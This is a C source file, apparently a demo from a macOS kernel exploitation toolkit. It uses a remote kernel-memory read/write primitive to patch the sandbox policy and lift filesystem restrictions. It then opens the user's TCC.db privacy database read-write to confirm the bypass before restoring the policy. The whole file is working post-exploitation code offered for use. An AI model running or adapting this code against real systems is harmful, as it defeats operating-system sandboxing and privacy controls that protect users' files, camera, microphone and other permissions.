//
//  main.c
//  demo_sb
//
//  Created by user on 1/7/22.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>

#include <sys/fcntl.h>
#include <sys/errno.h>

#include <xe/xe.h>
#include <xe/memory/kmem.h>
#include <xe/memory/kmem_remote.h>
#include <xe/slider/kernel.h>
#include <xe/util/log.h>
#include <xe/util/sandbox.h>
#include <xe/util/assert.h>


int main(int argc, const char * argv[]) {
    if (argc != 2) {
        xe_log_error("invalid arguments");
        xe_log_info("usage: demo_sb <path-to-kmem-socket>");
        exit(1);
    }
    
    xe_init();
    xe_kmem_backend_t backend = xe_kmem_remote_client_create(argv[1]);
    xe_kmem_use_backend(backend);
    xe_slider_kernel_init(xe_kmem_remote_client_get_mh_execute_header(backend));
    
    xe_util_sandbox_t sandbox = xe_util_sandbox_create();
    xe_log_info("patching sandbox policy to get unrestricted filesystem access");
    xe_util_sandbox_disable_fs_restrictions(sandbox);
    
    xe_log_info("verifying unrestricted filesystem access");
    char* home = getenv("HOME");
    char tcc_db[PATH_MAX];
    snprintf(tcc_db, sizeof(tcc_db), "%s/Library/Application Support/com.apple.TCC/TCC.db", home);
    int fd = open(tcc_db, O_RDWR);
    if (fd < 0) {
        xe_log_error("verfication failed, failed to open TCC.db at %s, err: %s", tcc_db, strerror(errno));
        xe_util_sandbox_destroy(&sandbox);
        exit(1);
    } else {
        xe_log_info("tcc.db open success, verification success");
    }
    
    getpass("\n\npress enter to restore sandbox policy\n\n");
    
    xe_log_info("restoring sandbox policy");
    xe_util_sandbox_destroy(&sandbox);
    return 0;
}
